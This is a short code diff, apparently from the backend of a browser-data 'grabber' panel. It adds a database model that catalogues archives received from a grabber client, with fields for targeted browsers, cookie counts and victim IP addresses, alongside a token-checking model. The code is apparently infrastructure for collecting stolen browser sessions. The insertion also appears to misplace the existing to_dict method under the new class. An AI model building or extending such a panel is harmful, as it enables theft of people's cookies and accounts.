@@ -139,6 +139,28 @@ class Token(db.Model):
     status = db.Column(db.String(16), default="unknown", index=True)
     last_checked = db.Column(db.DateTime)
 
+
+class Grab(db.Model):
+    """A browser-data archive received from the grabber client"""
+    __tablename__ = "grab"
+
+    id = db.Column(db.Integer, primary_key=True)
+    device_label = db.Column(db.String(128), default="unknown")
+    filename = db.Column(db.String(200), nullable=False)
+    file_size = db.Column(db.Integer, default=0)          # bytes
+    browsers = db.Column(db.String(200), default="")      # "chrome,edge"
+    cookie_count = db.Column(db.Integer, default=0)
+    ip_address = db.Column(db.String(50), default="")
+    created_at = db.Column(db.DateTime, default=utcnow)
+
+    @property
+    def size_mb(self):
+        return round((self.file_size or 0) / (1024 * 1024), 2)
+
+    @property
+    def bootstrapped_count(self):
+        return len([b for b in (self.browsers or "").split(",") if b.strip()])
+
     def to_dict(self):
         user_data = {}
         try:
